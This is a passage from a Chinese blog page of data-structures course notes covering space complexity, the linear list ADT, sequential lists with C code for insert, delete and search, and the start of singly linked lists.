alt="常见累加求和公式"></p><p><img src="/img/%E5%A4%8D%E6%9D%82%E5%BA%A6%E6%8E%92%E5%BA%8F.png" alt="复杂度排序"></p><h3 id="3-4渐进空间复杂度"><a href="#3-4渐进空间复杂度" class="headerlink" title="3.4渐进空间复杂度"></a>3.4渐进空间复杂度</h3><p>空间复杂度：算法所需存储空间的度量，记作： <em><strong>S(n)&#x3D;O(f(n))</strong></em><br>其中n为问题规模（或大小）</p><p><img src="/img/%E6%B8%90%E8%BF%9B%E7%A9%BA%E9%97%B4%E5%A4%8D%E6%9D%82%E5%BA%A61.png" alt="渐进空间复杂度1"></p><h1 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a>第二章</h1><p>线性结构：<br>线性结构表达式：（a1 , a2 , ……, an）</p><blockquote><p>线性结构的特点：</p></blockquote><pre><code>① 只有一个首结点和尾结点；② 除首尾结点外，其他结点只有一个直接前驱和一个直接后继。</code></pre><p>简言之，线性结构反映结点间的逻辑关系是 一对一 的<br>线性结构包括线性表、堆栈、队列、字符串、数组等等，<br>其中，最典型、最常用的是线性表</p><h2 id="1线性表的定义和特点"><a href="#1线性表的定义和特点" class="headerlink" title="1线性表的定义和特点"></a>1线性表的定义和特点</h2><p>线性表的定义：用数据元素的有限序列表示</p><p><img src="/img/%E7%BA%BF%E6%80%A7%E8%A1%A8%E7%9A%84%E5%AE%9A%E4%B9%89%E5%92%8C%E7%89%B9%E7%82%B9.png" alt="线性表的定义和特点"></p><p>数据元素都是字母; 元素间关系是线性</p><p>同一线性表中的元素必定具有相同特性</p><h2 id="2案例引入"><a href="#2案例引入" class="headerlink" title="2案例引入"></a>2案例引入</h2><p><img src="/img/%E7%BA%BF%E6%80%A7%E8%A1%A8%E6%A1%88%E4%BE%8B.png" alt="线性表案例"><br>总结：</p><ul><li>线性表中数据元素的类型可以为简单类型（一元多项式），也可以为复杂类型（图书信息）。</li><li>许多实际应用问题所涉的基本操作有很大相似性，不应为每个具体应用单独编写一个程序。</li><li>从具体应用中抽象出共性的逻辑结构和基本操作（抽象数据类型），然后实现其存储结构和基本操作。</li></ul><h2 id="3线性表的类型定义"><a href="#3线性表的类型定义" class="headerlink" title="3线性表的类型定义"></a>3线性表的类型定义</h2><blockquote><p>线性表的重要基本操作</p></blockquote><p>初始化,取值，查找，插入，删除</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">ADT List&#123;</span><br><span class="line">数据关系：R=&#123;&lt;a i-1 ,ai&gt;lai-1 pai ED,i=2,…,n&#125;</span><br><span class="line">基本操作：</span><br><span class="line">Init List&#123;&amp;L&#125;</span><br><span class="line">操作结果：构造一个空的线性表L。</span><br><span class="line">Destroy List(&amp;L)</span><br><span class="line">初始条件：线性表L已存在.</span><br><span class="line">操作结果：销毁线性表L。</span><br><span class="line">Clear List I EL</span><br><span class="line">初始条件：线性表L已存在。</span><br><span class="line">操作结果：将L重置为空表。</span><br><span class="line">List Empty(L)</span><br><span class="line">初始条件：线性表L已存在。</span><br><span class="line">操作结果：若L为空表，则返回true，否则返回 false o</span><br><span class="line">List Length(L)</span><br><span class="line">初始条件：线性表L已存在</span><br><span class="line">操作结果：返回中数据元素个数。</span><br><span class="line">Get El em（L，i,&amp;e）</span><br><span class="line">初始条件：线性表L已存在，且１≤i≤List Length(L)。</span><br><span class="line">操作结果：用e返回中第1个数据元素的值，</span><br><span class="line">Locate El em(L,e)</span><br><span class="line">初始条件：线性表L已存在，</span><br><span class="line">操作结果：返回L中第1个值与e相同的元素在L中的位置。若这样的数据元素不存在，则返回值为0。</span><br><span class="line">Prior El em(I,cur_e,&amp;pre_e)</span><br><span class="line">初始条件：线性表L已存在。</span><br><span class="line">操作结果：若cur_e是L的数据元素，且不是第一个，则用pre_e返回其前驱，否则操作失败，pre_e无定义</span><br><span class="line">NextElem(L,cur_e,&amp;next_e)</span><br><span class="line">初始条件：线性表L已存在.</span><br><span class="line">操作结果：若cur_e是L的数据元素，且不是最后一个，则用next_e返回其后继，否则操作失败，next_e无定义。</span><br><span class="line">List Insert(&amp;L,ive)</span><br><span class="line">初始条件：线性表L已存在，且1≤i≤List Length(L)+1 o</span><br><span class="line">操作结果：在L中第i个位置之前插人新的数据元索e，L的长度加1。</span><br><span class="line">List Delete l&amp;L i</span><br><span class="line">初始条件：线性表L已存在且非空，且1≤i≤List Length（L）。</span><br><span class="line">操作结果：删除L的第i个数据元素，L的长度减1。</span><br><span class="line">初始条件：线性表L已存在。</span><br><span class="line">操作结果：对线性表工进行遍历，在遍历过程中对工的每个结点访问一次。</span><br><span class="line">&#125;ADT List</span><br></pre></td></tr></table></figure><ul><li>抽象数据类型仅为模型<br>定义，不涉及具体实现</li><li>该抽象数据类型给出的<br>操作是基本操作，基于<br>此可以构成其他更复杂<br>操作</li><li>对于不同应用，基本操<br>作的接口可能不同</li><li>抽象数据类型定义的线<br>性表可根据实际所采用<br>的存储结构形式进行具<br>体的表示和实现</li></ul><h2 id="4线性表的顺序表示和实现"><a href="#4线性表的顺序表示和实现" class="headerlink" title="4线性表的顺序表示和实现"></a>4线性表的顺序表示和实现</h2><blockquote><p>线性表的顺序表示又称为顺序存储结构或顺序映像</p></blockquote><p><em><strong>顺序存储</strong></em><br>把逻辑上相邻的数据元素存储在物理上相邻的存储单元中的存储结构。简言之，逻辑上相邻，物理上也相邻</p><p><em><strong>顺序存储</strong></em><br>用一组地址连续的存储单元依次存储线性表的元素，可通过数组V[n]来实现</p><h3 id="4-1顺序表的类型定义"><a href="#4-1顺序表的类型定义" class="headerlink" title="4.1顺序表的类型定义"></a>4.1顺序表的类型定义</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAXSIZE 100 <span class="comment">//最大长度</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> //定义顺序表结构体</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">ElemType *elem; <span class="comment">//指向数据元素的基地址， ElemType为统一描述而定义，实际使用用基本类型或者结构体替换</span></span><br><span class="line"><span class="type">int</span> length; <span class="comment">//线性表的当前长度（注意：C语言中数组的下标是从0开始，元素位置序号是从1开始） </span></span><br><span class="line">&#125;SqList； <span class="comment">//顺序表的结构类型为SqList，结构体别名</span></span><br></pre></td></tr></table></figure><blockquote><p>一元多项式</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAXSIZE 100 <span class="comment">//多项式可能达到的最大长度</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> //多项式非零项的定义</span></span><br><span class="line"><span class="class">&#123;</span> </span><br><span class="line"><span class="type">float</span> coef; <span class="comment">//系数</span></span><br><span class="line"><span class="type">int</span> expn; <span class="comment">//指数</span></span><br><span class="line">&#125;Polynomial; </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span> </span><br><span class="line">Polynomial *elem; <span class="comment">//存储空间的基地址</span></span><br><span class="line"><span class="type">int</span> length; <span class="comment">//多项式中当前项个数</span></span><br><span class="line">&#125;SqList; <span class="comment">//多项式的顺序存储结构类型为SqList</span></span><br></pre></td></tr></table></figure><blockquote><p>图书顺序表</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAXSIZE 10000 <span class="comment">//图书表可能达到的最大长度</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> //图书信息定义</span></span><br><span class="line"><span class="class">&#123;</span> </span><br><span class="line"><span class="type">char</span> no[<span class="number">20</span>]; <span class="comment">//图书ISBN</span></span><br><span class="line"><span class="type">char</span> name[<span class="number">50</span>]; <span class="comment">//图书名字</span></span><br><span class="line"><span class="type">float</span> price; <span class="comment">//图书价格</span></span><br><span class="line">&#125;Book; </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span> </span><br><span class="line">Book *elem; <span class="comment">//存储空间的基地址（ElemType 为Book结构体）</span></span><br><span class="line"><span class="type">int</span> length; <span class="comment">//图书表中当前图书个数</span></span><br><span class="line">&#125;SqList; <span class="comment">//图书表的顺序存储结构类型为SqList</span></span><br></pre></td></tr></table></figure><blockquote><p>补充：C语言的动态分配函数（ &lt;stdlib.h&gt; ）</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(m)</span><br><span class="line"><span class="comment">//开辟m字节长度的地址空间，并返回这段空间的首地址</span></span><br><span class="line"><span class="keyword">sizeof</span>(x)</span><br><span class="line"><span class="comment">//计算变量x的长度。</span></span><br><span class="line"><span class="built_in">free</span>(p)</span><br><span class="line"><span class="comment">// 释放指针p所指变量的存储空间，即彻底删除一个变量</span></span><br></pre></td></tr></table></figure><h3 id="4-2线性表的重要基本操作"><a href="#4-2线性表的重要基本操作" class="headerlink" title="4.2线性表的重要基本操作"></a>4.2线性表的重要基本操作</h3><h4 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h4><p>参数用引用的情况:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">InitList_Sq</span><span class="params">(SqList &amp;L)</span> <span class="comment">//构造一 个空的顺序表L </span></span><br><span class="line">&#123;</span><br><span class="line">L.elem=new ElemType[MAXSIZE]; <span class="comment">//为顺序表分配空间</span></span><br><span class="line"><span class="keyword">if</span>(!L.elem) <span class="built_in">exit</span>(OVERFLOW); <span class="comment">//存储分配失败</span></span><br><span class="line">L.length=<span class="number">0</span>; <span class="comment">//空表长度为0</span></span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>参数用指针的情况:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">InitList_Sq</span><span class="params">(SqList *L)</span> <span class="comment">//构造一个空的顺序表L</span></span><br><span class="line"> &#123; L-&gt; elem=new ElemType[MAXSIZE]; <span class="comment">//为顺序表分配空间</span></span><br><span class="line"><span class="keyword">if</span>(! L-&gt; elem) <span class="built_in">exit</span>(OVERFLOW); <span class="comment">//存储分配失败</span></span><br><span class="line">L-&gt; length=<span class="number">0</span>; <span class="comment">//空表长度为0</span></span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>补充：几个简单基本操作的算法实现</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">销毁线性表L:</span><br><span class="line"><span class="type">void</span> <span class="title function_">DestroyList</span><span class="params">(SqList &amp;L)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (L.elem) delete[]L.elem;</span><br><span class="line"><span class="comment">//释放存储空间（如果存在元</span></span><br><span class="line">素） </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">清空线性表L:</span><br><span class="line"><span class="type">void</span> <span class="title function_">ClearList</span><span class="params">(SqList &amp;L)</span> </span><br><span class="line">&#123;</span><br><span class="line">L.length=<span class="number">0</span>; </span><br><span class="line"><span class="comment">//将线性表的长度置为0 </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">求线性表L的长度:</span><br><span class="line"><span class="type">int</span> <span class="title function_">GetLength</span><span class="params">(SqList L)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> (L.length); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">判断线性表L是否为空:</span><br><span class="line"><span class="type">int</span> <span class="title function_">IsEmpty</span><span class="params">(SqList L)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (L.length==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>; </span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="取值"><a href="#取值" class="headerlink" title="取值"></a>取值</h4><p>随机存取</p><p>获取线性表L中的某个数据元素的内容:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">GetElem</span><span class="params">(SqList L, <span class="type">int</span> i, ElemType &amp;e)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (i&lt;<span class="number">1</span>||i&gt;L.length) <span class="keyword">return</span> ERROR;</span><br><span class="line"><span class="comment">//判断i值是否合理，若不合理，返回ERROR</span></span><br><span class="line">e=L.elem[i<span class="number">-1</span>]; <span class="comment">//第i-1的单元存储着第i个数据</span></span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h4><p>在线性表L中查找值为e的数据元素:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">LocateELem</span><span class="params">(SqList L,ElemType e)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>; i&lt; L.length; i++)</span><br><span class="line">    <span class="keyword">if</span> (L.elem[i]==e) <span class="keyword">return</span> i+<span class="number">1</span>; </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>平均查找长度（ASL）：在执行查找时，为确定元素在顺序表中的位置，须和给定值<strong>进行比较的数据元素个数的期望值</strong>成为查找算法在查找成功时的平均查找长度（ASL）。</p><p>最好的情况：需比较1次<br>最坏的情况：需比较n次<br>如果每个元素的查找概率相等，即p&#x3D;1&#x2F;n,</p><blockquote><p>则平均查找长度为 <em><strong>(n+1)&#x2F;2</strong></em></p></blockquote><p>平均时间复杂度O(n)</p><h4 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h4><ul><li>插第 4 个结点之前，移动 6-4+1 次</li><li>插在n个元素的第 i 个结点之前，移动 n-i+1 次</li></ul><blockquote><p>【算法步骤】</p></blockquote><p>1.判断插入位置i 是否合法。 </p><p>2.判断顺序表的存储空间是否已满。</p><p>3.将第n至第i 位的元素依次向后移<br>动一个位置，空出第i个位置。</p><p>4.将要插入的新元素e放入第i个位置</p><p>5.表长加1，插入成功返<br>回OK。</p><blockquote><p>【算法描述】</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">ListInsert_Sq</span> <span class="params">(SqList &amp;L, <span class="type">int</span> i, ElemType e)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (i&lt;<span class="number">1</span> || i&gt;L.length+<span class="number">1</span>) <span class="keyword">return</span> ERROR; <span class="comment">//i值不合法</span></span><br><span class="line"><span class="keyword">if</span> (L.length==MAXSIZE) <span class="keyword">return</span> ERROR; <span class="comment">//当前存储空间已满</span></span><br><span class="line"><span class="keyword">for</span> (j=L.length<span class="number">-1</span>;j&gt;=i<span class="number">-1</span>;j--) </span><br><span class="line">L.elem[j+<span class="number">1</span>]=L.elem[j]; <span class="comment">//插入位置及之后的元素后移</span></span><br><span class="line">L.elem[i<span class="number">-1</span>]=e; <span class="comment">//将新元素e放入第i个位置</span></span><br><span class="line">++L.length; <span class="comment">//表长增1</span></span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>【算法分析】</p></blockquote><p>算法时间主要耗费在移动元素的操作上</p><ul><li>若插入在尾结点之后，则根本无需移动（特别快）；</li><li>若插入在首节点之前，若元素全部后移（特别慢）；</li><li>若要考虑在各种位置插入（n个元素，共n+1种插入可能）的平均移动次数</li></ul><blockquote><p>平均移动次数（AMN）<em><strong>n&#x2F;2</strong></em></p></blockquote><p>平均时间复杂度O(n)</p><h4 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h4><blockquote><p>【算法步骤】</p></blockquote><p>（1）判断删除位置 i 是否合法（合法值为1≤i≤n）。</p><p>（2）将第i+1至第n 位的元素依次向前移动一个位置。</p><p> （3）表长减1，删除成功返回OK。</p><blockquote><p>【算法描述】</p></blockquote><p> 将线性表L中第i个数据元素删除<br> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> Status <span class="title function_">ListDelete_Sq</span><span class="params">(SqList &amp;L,<span class="type">int</span> i)</span> &#123;</span><br><span class="line"><span class="keyword">if</span>((i&lt;<span class="number">1</span>)||(i&gt;L.length)) <span class="keyword">return</span> ERROR; <span class="comment">//i值不合法</span></span><br><span class="line"><span class="keyword">for</span> (j=i; j&lt;=L.length<span class="number">-1</span>; j++) </span><br><span class="line">L.elem[j<span class="number">-1</span>]=L.elem[j]; <span class="comment">//被删除元素之后的元素前移</span></span><br><span class="line">--L.length; <span class="comment">//表长减1</span></span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><blockquote><p>【算法分析】</p></blockquote><p>算法时间主要耗费在移动元素的操作上</p><ul><li>若删除尾结点，则根本无需移动（特别快）；</li><li>若删除首结点，则表中n-1个元素全部前移（特别慢）；</li><li>若要考虑在各种位置删除（n个元素，共n种可能）的平均移动次数，该如何计算？</li></ul><blockquote><p>平均移动次数 <em><strong>(n-1)&#x2F;2</strong></em></p></blockquote><p>平均时间复杂度O(n)</p><h3 id="4-3顺序表的特点"><a href="#4-3顺序表的特点" class="headerlink" title="4.3顺序表的特点"></a>4.3顺序表的特点</h3><ul><li><p>利用数据元素的存储位置表示线性表中相邻数据元素之间的前后关系，即 <strong>线性表的逻辑结构与存储结构一致</strong></p></li><li><p>在访问线性表时，可以快速地计算出任何一个数据元素的存储地址。因此可以粗略地认为，<strong>访问每个元素所花时间相等</strong></p></li></ul><p>这种存取元素的方法被称为随机存取法!</p><pre><code>优点:存储密度大（结点本身所占存储量/结点结构所占存储量）可以随机存取表中任一元素缺点:在插入、删除某一元素时，需要移动大量元素初始分配固定空间，浪费存储空间属于静态存储形式，数据元素的个数不能自由扩充</code></pre><h2 id="5线性表的链式表示和实现"><a href="#5线性表的链式表示和实现" class="headerlink" title="5线性表的链式表示和实现"></a>5线性表的链式表示和实现</h2><p><em><strong>链式存储结构</strong></em><br>结点在存储器中的位置是任意<br>的，即逻辑上相邻的数据元素<br>在物理上不一定相邻</p><p>线性表的链式表示又称为非顺序映像或链式映像。</p><p>通过指针来实现</p><h3 id="5-1与链式存储有关的术语"><a href="#5-1与链式存储有关的术语" class="headerlink" title="5.1与链式存储有关的术语"></a>5.1与链式存储有关的术语</h3><p>1、<strong>结点</strong>：数据元素的存储映像。由数据域和指针域两部分组成</p><p>2、<strong>链表</strong>：n 个结点由指针链组成一个链表。它是线性表的链式存储映像，称为线性表的链式存储结构</p><p>3、<strong>单链表、双链表、循环链表</strong>： </p><ul><li>结点只有一个指针域的链表，称为单链表或线性链表</li><li>有两个指针域的链表，称为双链表</li><li>首尾相接的链表称为循环链表</li></ul><p>4、<strong>头指针、头结点和首元结点</strong>:</p><ul><li>头指针是指向链表中第一个结点的指针</li><li>头结点是在链表的首元结点之前附设的一个结点 <strong>（不是第一个元素节点！！）</strong>；数据域内只放空表标志和表长等信息</li><li>首元结点是指链表中存储第一个数据元素a1的结点</li></ul><p><img src="/img/%E7%A9%BA%E8%A1%A8%E7%9A%84%E8%A1%A8%E7%A4%BA.png" alt="空表的表示"></p><p><img src="/img/%E5%A4%B4%E7%BB%93%E7%82%B9%E7%9A%84%E5%A5%BD%E5%A4%84.png" alt="头结点的好处"></p><p><img src="/img/%E5%A4%B4%E8%8A%82%E7%82%B9%E7%9A%84%E6%95%B0%E6%8D%AE%E5%9F%9F.png" alt="头节点的数据域"></p><h3 id="5-2链表（链式存储结构）的特点"><a href="#5-2链表（链式存储结构）的特点" class="headerlink" title="5.2链表（链式存储结构）的特点"></a>5.2链表（链式存储结构）的特点</h3><ul><li>结点在存储器中的位置是任意的，即逻辑上相邻的数据元素在物理上不一定相邻</li><li>访问时只能通过头指针进入链表，并通过每个结点的指针域向后扫描其余结点，所以寻找第一个结点和最后一个结点所花费的时间不等!!!<blockquote><p>这种存取元素的方法被称为 <strong>顺序存取法</strong></p></blockquote></li></ul><p>链表的优缺点:</p><p>优点</p><ul><li>数据元素的个数可以自由扩充</li><li>插入、删除等操作不必移动数据，只需修改链接指针，修改效率较高</li></ul><p>缺点</p><ul><li>存储密度小</li><li>存取效率不高，必须采用顺序存取，即存取数据元素时，只能按链表的顺序进行访问（顺藤摸瓜）</li></ul><h3 id="5-3单链表的定义和实现"><a href="#5-3单链表的定义和实现" class="headerlink" title="5.3单链表的定义和实现"></a>5.3单链表的定义和实现</h3><p>单链表是由表头唯一确定，因此单链表可以用头指针的名字来命名</p><p>若头指针名是L，则把链表称为表L</p><blockquote><p>单链表的存储结构定义</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">ElemType data; <span class="comment">//节点的数据域</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">next</span>;</span> <span class="comment">//节点的指针域</span></span><br><span class="line">&#125;LNode,*LinkList;</span><br><span class="line"><span class="comment">// *LinkList为Lnode类型的指针</span></span><br></pre></td></tr></table></figure><ul><li><p>LinkList与LNode *本质是等价的，Linklist定义单链表强调链表的头指针p，LNode定义指向单链表中任意节点的指针p</p></li><li><p>注意区分指针变量和结点变量两个不同的概念</p><pre><code>  指针变量 p ：表示结点地址  结点变量*p：表示一个结点</code></pre></li><li><p>若p-&gt;data&#x3D;ai, &#x2F;&#x2F;p是指向第i个元素的ai的指针，</p><p>  则p-&gt;next是指向第i+1个元素的指针</p><p>  则p-&gt;next-&gt;data&#x3D;ai+1</p></li></ul><blockquote><p>单链表基本操作的实现</p></blockquote><p>初始化; 取值; 查找; 插入; 删除.</p><h4 id="初始化-1"><a href="#初始化-1" class="headerlink" title="初始化"></a>初始化</h4><blockquote><p>【算法步骤】 </p></blockquote><p>（1）生成新结点作头结点，用头指针L指向头结点。 </p><p>（2）头结点的指针域置空</p><blockquote><p>【算法描述】</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">InitList_L</span><span class="params">(LinkList &amp;L)</span></span><br><span class="line">&#123; </span><br><span class="line">L=new LNode; <span class="comment">//头指针L指向头结点</span></span><br><span class="line">L-&gt;next=<span class="literal">NULL</span>; <span class="comment">//头结点的指针域置空（头结点的指针域指</span></span><br><span class="line">向第一个节点）</span><br><span class="line"><span class="keyword">return</span> OK; </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>补充：几个简单基本操作的算法实现</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">销毁:</span><br><span class="line"></span><br><span class="line">Status <span class="title function_">DestroyList_L</span><span class="params">(LinkList &amp;L)</span></span><br><span class="line">&#123;</span><br><span class="line">LinkList p;</span><br><span class="line"><span class="keyword">while</span> (L) <span class="comment">//只要链表头指针不为空</span></span><br><span class="line">&#123;</span><br><span class="line">p=L; <span class="comment">//链表的头指针赋值给p（用于辅助操作指针变量）</span></span><br><span class="line">L=L-&gt;next; <span class="comment">//链表头结点的指针赋值给头指针（头指针指</span></span><br><span class="line">向下一个节点）</span><br><span class="line">delete p; <span class="comment">//删除指针p指向的节点</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">清空:</span><br><span class="line">Status <span class="title function_">ClearList</span><span class="params">(LinkList &amp; L)</span>&#123;<span class="comment">// 将L重置为空表</span></span><br><span class="line">LinkList p,q;</span><br><span class="line">p=L-&gt;next; <span class="comment">//p指向第一个元素结点</span></span><br><span class="line"><span class="keyword">while</span>(p) <span class="comment">//没到表尾（当最后一个节点被删除后，p指针</span></span><br><span class="line">将变为空指针）</span><br><span class="line">&#123; </span><br><span class="line">q=p-&gt;next; <span class="comment">//指针q指向下一个节点</span></span><br><span class="line">delete p; <span class="comment">//删除p指向的当前节点</span></span><br><span class="line">p=q; <span class="comment">//指针p指向下一个节点</span></span><br><span class="line">&#125;L-&gt;next=<span class="literal">NULL</span>; <span class="comment">//头结点指针域为空</span></span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">求表的长度:</span><br><span class="line"><span class="type">int</span> <span class="title function_">ListLength_L</span><span class="params">(LinkList L)</span>&#123;</span><br><span class="line"><span class="comment">//返回L中数据元素个数</span></span><br><span class="line">LinkList p;</span><br><span class="line">p=L-&gt;next; 